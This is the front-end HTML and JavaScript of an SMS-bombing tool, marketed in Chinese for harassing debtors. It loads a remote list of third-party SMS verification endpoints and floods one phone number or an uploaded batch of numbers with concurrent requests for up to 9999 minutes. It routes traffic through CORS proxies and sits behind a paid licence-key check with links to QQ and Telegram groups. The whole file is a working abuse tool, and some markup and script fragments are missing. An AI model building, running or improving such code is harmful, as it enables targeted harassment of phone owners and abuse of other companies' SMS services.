<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

.input-group input { flex: 1; background: transparent; border: none; padding: 12px 0; color: #fff; font-size: 16px; outline: none; }
.input-group input::placeholder { color: #888; }
.input-group .eye { background: none; border: none; color: #aaa; font-size: 18px; cursor: pointer; padding: 8px; }
.row { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; }
.row label { color: #aaa; font-size: 14px; white-space: nowrap; }
.row input[type="number"] { width: 80px; background: #2a2a2a; border: 1px solid #3a3a3a; border-radius: 6px; padding: 6px; color: #fff; text-align: center; font-size: 14px; }
.row .hint { color: #666; font-size: 12px; margin-left: auto; }
.btn { width: 100%; padding: 14px; border: none; border-radius: 8px; color: #fff; font-size: 17px; font-weight: 600; cursor: pointer; transition: background 0.2s; margin-bottom: 8px; }
.btn-primary { background: #007aff; }
.btn-primary:not(:disabled):hover { background: #005bbf; }
.btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
.btn-qq { background: #12b7f5; }
.btn-tg { background: #0088cc; }
.btn-group { display: flex; flex-direction: column; gap: 8px; }
.status { text-align: center; font-size: 14px; min-height: 24px; margin-bottom: 8px; color: #6af; }
.log { background: #111; border-radius: 6px; padding: 10px 12px; height: 200px; overflow-y: auto; font-family: "Menlo", "Consolas", monospace; font-size: 12px; color: #0f0; white-space: pre-wrap; word-break: break-all; line-height: 1.6; border: 1px solid #2a2a2a; margin-top: 8px; }
.log::-webkit-scrollbar { width: 4px; }
.log::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
.modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 9999; padding: 20px; }
.modal-box { background: #1e1e1e; border-radius: 16px; padding: 24px; width: 100%; max-width: 360px; box-shadow: 0 8px 30px rgba(0,0,0,0.8); border: 1px solid #333; text-align: center; }
.modal-box h2 { font-size: 20px; margin-bottom: 20px; color: #fff; }
.modal-box input { width: 100%; padding: 12px 14px; background: #2a2a2a; border: 1px solid #3a3a3a; border-radius: 8px; color: #fff; font-size: 15px; outline: none; margin-bottom: 12px; }
.modal-box input:focus { border-color: #007aff; }
.modal-box .btn-verify { width: 100%; padding: 12px; background: #007aff; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
.modal-box .btn-buy { width: 100%; padding: 12px; background: #12b7f5; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
.modal-status { text-align: center; font-size: 13px; margin-bottom: 10px; min-height: 18px; color: #f44; white-space: pre-line; }
.modal-status.ok { color: #0f0; }
.free-box { background: linear-gradient(135deg, #1e3a1e 0%, #1e1e1e 100%); border: 1px solid #2e7d32; }
.free-box h2 { font-size: 22px; color: #4caf50; margin-bottom: 8px; }
.free-box .free-desc { color: #aaa; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
.free-box .btn-ok { width: 100%; padding: 12px; background: #2e7d32; border: none; border-radius: 8px; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }

.btn-upload { background: #2c6b2c; border: none; color: #fff; padding: 10px 16px; height: 40px; border-radius: 8px; font-size: 14px; cursor: pointer; white-space: nowrap; font-weight: 600; }
.btn-upload:hover { background: #38853a; }
.file-label { flex: 1; color: #888; font-size: 12px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.file-label.loaded { color: #00e660; }
#fileInput { display: none; }

<div class="modal-overlay" id="cardModal" style="display:flex;">

    <button class="btn-verify" id="verifyBtn">提交验证</button>
    <button class="btn-buy" id="buyBtn">前往卡网购买卡密</button>
  </div>
</div>

<div class="modal-overlay" id="freeModal">

    <button class="btn-ok" id="freeOkBtn">确定</button>
  </div>
</div>

<div class="card" id="mainApp" style="display:none;">

  <div class="sub">持续轰炸 · 专治不还钱</div>
  <div class="input-group">
    <input type="password" id="phoneInput" placeholder="单个手机号（可选）" maxlength="11" inputmode="numeric">
    <button class="eye" id="eyeBtn">👁</button>
  </div>
  <div class="upload-row">
    <button class="btn-upload" id="uploadBtn">📂 上传txt号码</button>
    <span class="file-label" id="fileLabel">未加载批量号码</span>
    <input type="file" id="fileInput" accept=".txt,text/plain">
  </div>
  <div class="row">
    <label for="minutesInput">持续分钟：</label>
    <input type="number" id="minutesInput" value="1" min="1" max="9999">
    <span class="hint">1 ~ 9999</span>
  </div>
  <div class="row">
    <label for="intervalInput">请求间隔(ms)：</label>
    <input type="number" id="intervalInput" value="100" min="0" max="10000">
    <span class="hint">0 ~ 10000</span>
  </div>
  <div class="btn-group">
    <button class="btn btn-primary" id="sendBtn">开始轰炸</button>
    <button class="btn btn-qq" id="qqBtn">💬 加入QQ群</button>
    <button class="btn btn-tg" id="tgBtn">✈️ 加入TG</button>
  </div>
  <div class="status" id="statusLabel">就绪</div>
  <div class="log" id="logArea">[系统] 加载接口中...</div>
</div>

function fetchWithTimeout(url, options, timeout) {
  timeout = timeout || 10000;
  const controller = new AbortController();

  return fetch(url, { ...options, signal: controller.signal })

function findMatchingChar(s, startIdx, open, close) {
  let depth = 0, i = startIdx, inString = false, quoteChar = null;
  while (i < s.length) {
    const c = s[i];
    if (inString) {
      if (c === '\\') { i += 2; continue; }
      if (c === quoteChar) inString = false;
      i++; continue;
    }
    if (c === "'" || c === '"') { inString = true; quoteChar = c; i++; continue; }
    if (c === open) depth++;
    else if (c === close) { depth--; if (depth === 0) return i; }
    i++;
  }
  return -1;
}
function splitTopLevel(s, sep) {
  const parts = [];
  let depth = 0, inString = false, quoteChar = null, start = 0;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (inString) {
      if (c === '\\') { i++; continue; }
      if (c === quoteChar) inString = false;
      continue;
    }
    if (c === "'" || c === '"') { inString = true; quoteChar = c; continue; }
    if (c === '(' || c === '[' || c === '{') depth++;
    else if (c === ')' || c === ']' || c === '}') depth--;
    else if (c === sep && depth === 0) { parts.push(s.slice(start, i)); start = i + 1; }
  }
  parts.push(s.slice(start));
  return parts;
}
function findTopLevelEq(s) {
  let depth = 0, inString = false, quoteChar = null;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (inString) {
      if (c === '\\') { i++; continue; }
      if (c === quoteChar) inString = false;
      continue;
    }
    if (c === "'" || c === '"') { inString = true; quoteChar = c; continue; }
    if (c === '(' || c === '[' || c === '{') depth++;
    else if (c === ')' || c === ']' || c === '}') depth--;
    else if (c === '=' && depth === 0) {
      if (s[i-1] === '=' || s[i+1] === '=') continue;
      if (s[i-1] === '!' || s[i-1] === '<' || s[i-1] === '>') continue;
      return i;
    }
  }
  return -1;
}
function findTopLevelColon(s) {
  let depth = 0, inString = false, quoteChar = null;
  for (let i = 0; i < s.length; i++) {
    const c = s[i];
    if (inString) {
      if (c === '\\') { i++; continue; }
      if (c === quoteChar) inString = false;
      continue;
    }
    if (c === "'" || c === '"') { inString = true; quoteChar = c; continue; }
    if (c === '(' || c === '[' || c === '{') depth++;
    else if (c === ')' || c === ']' || c === '}') depth--;
    else if (c === ':' && depth === 0) return i;
  }
  return -1;
}
function parsePyStr(s) {
  if (!s) return '';
  const quote = s[0];
  if (quote !== "'" && quote !== '"') return s;
  let i = 1, out = '';
  while (i < s.length && s[i] !== quote) {
    if (s[i] === '\\' && i + 1 < s.length) {
      const c = s[i+1];
      if (c === 'n') out += '\n';
      else if (c === 't') out += '\t';
      else if (c === 'r') out += '\r';
      else if (c === '\\') out += '\\';
      else if (c === quote) out += quote;
      else out += c;
      i += 2;
    } else { out += s[i]; i++; }
  }
  return out;
}
function parsePyLiteral(s) {
  s = (s || '').trim();
  if (!s) return null;
  if (s === 'True') return true;
  if (s === 'False') return false;
  if (s === 'None') return null;
  if (s[0] === '{') return parsePyDict(s);
  if (s[0] === '[') {
    const body = s.slice(1, -1);
    return splitTopLevel(body, ',').map(x => parsePyLiteral(x));
  }
  if (s[0] === "'" || s[0] === '"') return parsePyStr(s);
  if (/^f['"]/.test(s)) return parsePyStr(s.slice(1));
  if (/^-?\d+$/.test(s)) return parseInt(s, 10);
  if (/^-?\d+\.\d+$/.test(s)) return parseFloat(s);
  return s;
}
function parsePyDict(s) {
  if (!s || s[0] !== '{') return {};
  const body = s.slice(1, -1);
  const obj = {};
  for (const part of splitTopLevel(body, ',')) {
    const trimmed = part.trim();
    if (!trimmed) continue;
    const colonIdx = findTopLevelColon(trimmed);
    if (colonIdx === -1) continue;
    let key = trimmed.slice(0, colonIdx).trim();
    const val = trimmed.slice(colonIdx + 1).trim();
    if (key[0] === "'" || key[0] === '"') key = parsePyStr(key);
    obj[key] = parsePyLiteral(val);
  }
  return obj;
}
function findVarStringAssignment(body, varName) {
  const esc = varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const re = new RegExp(`(?:^|\\n)[ \\t]*${esc}[ \\t]*=[ \\t]*(f?)(['"])([\\s\\S]*?)\\2`, 'm');
  const m = re.exec(body);
  return m ? m[3] : null;
}
function findVarDictAssignment(body, varName) {
  const esc = varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const re = new RegExp(`(?:^|\\n)[ \\t]*${esc}[ \\t]*=[ \\t]*\\{`, 'm');
  const m = re.exec(body);
  if (!m) return null;
  const startIdx = m.index + m[0].length - 1;
  const endIdx = findMatchingChar(body, startIdx, '{', '}');
  return endIdx === -1 ? null : parsePyDict(body.slice(startIdx, endIdx + 1));
}
function findVarDictOrStringAssignment(body, varName) {
  const esc = varName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  const re = new RegExp(`(?:^|\\n)[ \\t]*${esc}[ \\t]*=[ \\t]*`, 'm');
  const m = re.exec(body);
  if (!m) return null;
  const startIdx = m.index + m[0].length;
  const c = body[startIdx];
  if (c === '{') {
    const endIdx = findMatchingChar(body, startIdx, '{', '}');
    return endIdx === -1 ? null : parsePyDict(body.slice(startIdx, endIdx + 1));
  }
  if (c === 'f' && (body[startIdx+1] === "'" || body[startIdx+1] === '"')) return parsePyStr(body.slice(startIdx + 1));
  if (c === "'" || c === '"') return parsePyStr(body.slice(startIdx));
  return null;
}
function parseFuncBody(body) {
  const reqRe = /\brequests\.(post|get)\s*\(/g;
  const m = reqRe.exec(body);
  if (!m) return null;
  const method = m[1].toUpperCase();
  const openParenIdx = m.index + m[0].length - 1;
  const closeParenIdx = findMatchingChar(body, openParenIdx, '(', ')');
  if (closeParenIdx === -1) return null;
  const argsStr = body.slice(openParenIdx + 1, closeParenIdx);
  const args = splitTopLevel(argsStr, ',');
  if (!args.length) return null;
  const urlVarName = args[0].trim();
  const kwargs = {};
  for (let i = 1; i < args.length; i++) {
    const arg = args[i].trim();
    const eq = findTopLevelEq(arg);
    if (eq === -1) continue;
    kwargs[arg.slice(0, eq).trim()] = arg.slice(eq + 1).trim();
  }
  let url = findVarStringAssignment(body, urlVarName);
  if (!url) return null;
  url = url.replace(/\{phone\}/g, '[phone]');
  let header = {};
  if (kwargs.headers) {
    const h = findVarDictAssignment(body, kwargs.headers);
    if (h) header = h;
  }
  let bodyType = 'none', bodyData = null, params = null;
  if (kwargs.json) {
    bodyType = 'json';
    const d = findVarDictAssignment(body, kwargs.json);
    if (d) bodyData = d;
  } else if (kwargs.data) {
    bodyType = 'form';
    const d = findVarDictOrStringAssignment(body, kwargs.data);
    if (d !== null) bodyData = d;
  }
  if (kwargs.params) {
    const p = findVarDictAssignment(body, kwargs.params);
    if (p) params = p;
  }
  return { url, method, bodyType, bodyData, params, header };
}
function parsePythonApis(code) {
  const apis = [];
  const lines = code.split('\n');
  const funcStarts = [];
  for (let i = 0; i < lines.length; i++) {
    if (/^def\s+send_sms_\d+\s*\(\s*phone\s*\)\s*:/.test(lines[i])) funcStarts.push(i);
  }
  funcStarts.push(lines.length);
  for (let k = 0; k < funcStarts.length - 1; k++) {
    const body = lines.slice(funcStarts[k] + 1, funcStarts[k + 1]).join('\n');
    try {
      const api = parseFuncBody(body);
      if (api) apis.push(api);
    } catch (e) {}
  }
  return apis;
}

// 4. 归一化 + 去重
// ============================================================
function normalizeApis(input) {
  const out = [];
  if (!Array.isArray(input)) return out;
  for (const item of input) {
    if (!item) continue;
    let url = null, method = 'GET', bodyType = 'none', bodyData = null, params = null, header = {};
    if (typeof item === 'string') url = item;
    else if (typeof item === 'object') {
      url = item.url || item.URL || item.u;
      method = (item.method || item.Method || (item.data ? 'POST' : 'GET')).toUpperCase();
      bodyType = item.bodyType || 'none';
      bodyData = item.bodyData !== undefined ? item.bodyData : (item.data !== undefined ? item.data : null);
      params = item.params || null;
      header = item.header || item.headers || {};
      if (bodyType === 'none' && item.data !== undefined && method === 'POST') bodyType = 'form';
    }
    if (!url || typeof url !== 'string') continue;
    url = url.trim();
    if (!/^https?:\/\//i.test(url)) continue;
    if (url.length < 12) continue;
    out.push({ url, method, bodyType, bodyData, params, header });
  }
  return out;
}
function dedupeApis(apis) {
  const seen = new Set();
  const out = [];
  for (const a of apis) {
    if (!a || !a.url) continue;
    const key = a.method + '::' + a.url;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(a);
  }
  return out;
}

var apis = [];
async function loadApisFromRemote() {
  let text = '';
  try {
    const res = await fetchWithTimeout(CONFIG.apiListUrl, { method: 'GET', cache: 'no-cache' }, 25000);
    if (!res.ok) throw new Error('HTTP ' + res.status);
    text = await res.text();
  } catch (err) {
    console.error('[接口] 远程加载失败:', err);
    appendLog('[系统] 远程加载失败: ' + err.message, '');
    return [];
  }
  let result = [];
  try {
    const json = JSON.parse(text);
    result = normalizeApis(json);
    if (result.length > 0) return dedupeApis(result);
  } catch (e) {}
  if (/def\s+send_sms_\d+\s*\(/.test(text) || /requests\.(get|post)\s*\(/.test(text)) {
    const pyList = parsePythonApis(text);
    result = normalizeApis(pyList);
    if (result.length > 0) return dedupeApis(result);
  }
  const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => /^https?:\/\//i.test(l));
  if (lines.length > 0) return dedupeApis(normalizeApis(lines));
  return [];
}

// 生成机器码（基于 localStorage）
function getOrCreateMac() {
  const storageKey = 'device_mac';
  let mac = localStorage.getItem(storageKey);
  if (!mac) {
    mac = generateMac();
    localStorage.setItem(storageKey, mac);
  }
  return mac;
}
function generateMac() {
  if (crypto.randomUUID) {
    return crypto.randomUUID().replace(/-/g, '');
  }
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  bytes[6] = (bytes[6] & 0x0f) | 0x40;
  bytes[8] = (bytes[8] & 0x3f) | 0x80;
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

// 带线路切换的验证（POST 提交，参照 4_5913481822636875511 文件）
async function verifyCard(card) {
  const mac = getOrCreateMac();
  const postData = new URLSearchParams({
    Softid: CONFIG.softid,
    Card: card,
    Version: CONFIG.version,
    Mac: mac
  }).toString();

  let lastError = '';

  for (let i = 0; i < CONFIG.apiUrls.length; i++) {
    const url = CONFIG.apiUrls[i];
    try {
      console.log(`尝试线路 ${i + 1}: ${url}`);
      const response = await fetchWithTimeout(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: postData
      }, 12000);

      if (!response.ok) throw new Error(`HTTP ${response.status}`);

      const resultText = await response.text();
      console.log(`线路 ${i + 1} 返回:`, resultText);

      // 成功：返回 16 位字符串（Token）
      if (resultText && resultText.trim().length === 16) {
        return { success: true, message: '验证成功', token: resultText.trim() };
      } else {
        lastError = `接口返回: ${resultText}`;
        console.warn(`线路 ${i + 1} 验证失败:`, resultText);
      }
    } catch (error) {
      lastError = `网络错误: ${error.message}`;
      console.warn(`线路 ${i + 1} 请求失败:`, error);
    }
  }

  return { success: false, message: `所有线路均不可用，最后错误: ${lastError}` };
}

      label.textContent = '❌ 未找到有效手机号';
      label.className = 'file-label';
      appendLog('❌ 上传文件未找到有效手机号', '');
      return;
    }
    batchPhones = nums;
    label.textContent = '✅ 已加载 ' + nums.length + ' 个号码';
    label.className = 'file-label loaded';
    appendLog('📂 上传文件成功，共 ' + nums.length + ' 个号码', '');
  };
  reader.readAsText(file, 'UTF-8');
  this.value = '';
});

// ============================================================
// 11. 请求核心
// ============================================================
function fillObject(obj, phone) {
  if (!obj || typeof obj !== 'object') return obj;
  const out = Array.isArray(obj) ? [] : {};
  for (const k in obj) {
    if (!Object.prototype.hasOwnProperty.call(obj, k)) continue;
    const v = obj[k];
    if (typeof v === 'string') {
      out[k] = v.replace(/\[phone\]/g, phone).replace(/\{phone\}/g, phone);
    } else if (v && typeof v === 'object') {
      out[k] = fillObject(v, phone);
    } else {
      out[k] = v;
    }
  }
  return out;
}
function buildQuery(obj) {
  if (!obj || typeof obj !== 'object') return '';
  const sp = new URLSearchParams();
  for (const k in obj) {
    if (!Object.prototype.hasOwnProperty.call(obj, k)) continue;
    const v = obj[k];
    if (v === null || v === undefined) continue;
    sp.append(k, String(v));
  }
  return sp.toString();
}

const FORBIDDEN_HEADERS = ['referer', 'cookie', 'host', 'user-agent', 'origin', 'connection', 'content-length'];

async function doFetch(url, options) {
  for (const proxyFn of CORS_PROXIES) {
    const finalUrl = proxyFn(url);
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), 8000);
      const resp = await fetch(finalUrl, { ...options, signal: controller.signal });
      clearTimeout(timer);
      if (resp.status >= 200 && resp.status < 400) return { ok: true, status: resp.status };
      if (resp.status > 0) return { ok: true, status: resp.status };
    } catch (e) {
      continue;
    }
  }
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 6000);
    await fetch(url, { ...options, mode: 'no-cors', signal: controller.signal });
    clearTimeout(timer);
    return { ok: true, status: 0, opaque: true };
  } catch (e) {
    return { ok: false, status: -1 };
  }
}

function sendRequest(api, phone) {
  return new Promise(resolve => {
    try {
      let url = api.url.replace(/\[phone\]/g, phone).replace(/\{phone\}/g, phone);
      if (api.params && typeof api.params === 'object') {
        const filledParams = fillObject(api.params, phone);
        const qs = buildQuery(filledParams);
        if (qs) url += (url.indexOf('?') !== -1 ? '&' : '?') + qs;
      }

      const rawHeaders = fillObject(api.header || {}, phone);
      const headers = {};
      for (const k in rawHeaders) {
        if (!Object.prototype.hasOwnProperty.call(rawHeaders, k)) continue;
        if (FORBIDDEN_HEADERS.indexOf(k.toLowerCase()) !== -1) continue;
        headers[k] = rawHeaders[k];
      }

      const options = { method: api.method, headers: headers, credentials: 'omit' };

      if (api.method === 'POST') {
        if (api.bodyType === 'json' && api.bodyData) {
          const body = fillObject(api.bodyData, phone);
          options.body = JSON.stringify(body);
          if (!headers['Content-Type'] && !headers['content-type']) {
            options.headers['Content-Type'] = 'application/json';
          }
        } else if (api.bodyType === 'form' && api.bodyData) {
          if (typeof api.bodyData === 'string') {
            options.body = api.bodyData.replace(/\[phone\]/g, phone).replace(/\{phone\}/g, phone);
          } else {
            const body = fillObject(api.bodyData, phone);
            options.body = buildQuery(body);
            if (!headers['Content-Type'] && !headers['content-type']) {
              options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            }
          }
        }
      }

      doFetch(url, options).then(r => {
        resolve({ success: r.ok, status: r.status });
      });
    } catch (e) {
      resolve({ success: false, status: -1 });
    }
  });
}

async function runConcurrent(tasks, concurrency) {
  const results = new Array(tasks.length);
  let idx = 0;
  async function worker() {
    while (idx < tasks.length) {
      const i = idx++;
      try { results[i] = await tasks[i](); }
      catch (e) { results[i] = { success: false, status: -1 }; }
    }
  }
  const workers = [];
  for (let i = 0; i < Math.min(concurrency, tasks.length); i++) workers.push(worker());
  await Promise.all(workers);
  return results;
}

// ============================================================
// 12. 轰炸主循环
// ============================================================
document.getElementById('sendBtn').addEventListener('click', async () => {
  const phoneInput = document.getElementById('phoneInput');
  const statusLabel = document.getElementById('statusLabel');
  const sendBtn = document.getElementById('sendBtn');
  const minutesInput = document.getElementById('minutesInput');
  const intervalInput = document.getElementById('intervalInput');

  let phones = [];
  if (batchPhones && batchPhones.length > 0) {
    phones = batchPhones.slice();
  } else {
    const single = phoneInput.value.trim();
    if (!/^1\d{10}$/.test(single)) {
      statusLabel.textContent = '❌ 请输入11位手机号或上传txt批量号码';
      statusLabel.style.color = '#f44';
      return;
    }
    phones = [single];
  }

  if (!apis || apis.length === 0) {
    statusLabel.textContent = '❌ 接口列表为空，请检查远程接口链接';
    statusLabel.style.color = '#f44';
    return;
  }

  let minutes = parseInt(minutesInput.value) || 1;
  if (minutes < 1) minutes = 1;
  if (minutes > 9999) minutes = 9999;
  minutesInput.value = minutes;

  let intervalMs = parseInt(intervalInput.value);
  if (isNaN(intervalMs) || intervalMs < 0) intervalMs = 100;
  if (intervalMs > 10000) intervalMs = 10000;
  intervalInput.value = intervalMs;

  sendBtn.disabled = true;
  statusLabel.textContent = `⏳ 持续轰炸中，剩余 ${minutes} 分钟...`;
  statusLabel.style.color = '#6af';
  appendLog(`📱 目标号码：${phones.length} 个` + (phones.length === 1 ? ` (${phones[0]})` : ''), phones[0] || '');
  appendLog(`⏱️ 持续 ${minutes} 分钟，共 ${apis.length} 个接口，间隔 ${intervalMs}ms`, '');

  const startTime = Date.now();
  const endTime = startTime + minutes * 60 * 1000;
  let successTotal = 0, failTotal = 0, round = 0;

  while (Date.now() < endTime) {
    round++;
    const remain = Math.max(0, Math.ceil((endTime - Date.now()) / 1000));
    const rM = Math.floor(remain / 60), rS = remain % 60;
    statusLabel.textContent = `⏳ 第 ${round} 轮 · 剩余 ${rM}分${rS}秒 · 成功 ${successTotal} 失败 ${failTotal}`;

    const tasks = [];
    for (const phone of phones) {
      for (const api of apis) {
        tasks.push(() => sendRequest(api, phone));
      }
    }

    const results = await runConcurrent(tasks, 30);

    let roundOk = 0, roundFail = 0;
    results.forEach(r => {
      if (r && r.success) { successTotal++; roundOk++; }
      else { failTotal++; roundFail++; }
    });
    appendLog(`🔄 第 ${round} 轮：${phones.length}×${apis.length} = ${tasks.length} 请求，成功 ${roundOk}，失败 ${roundFail}`, '');

    if (intervalMs > 0) await new Promise(r => setTimeout(r, intervalMs));
  }

  const elapsed = Math.round((Date.now() - startTime) / 1000);
  const msg = `✅ 完成！持续 ${elapsed} 秒，共 ${round} 轮，成功 ${successTotal} 次，失败 ${failTotal} 次`;
  statusLabel.textContent = msg;
  statusLabel.style.color = '#0f0';
  appendLog(msg, '');
  sendBtn.disabled = false;
});
</script>
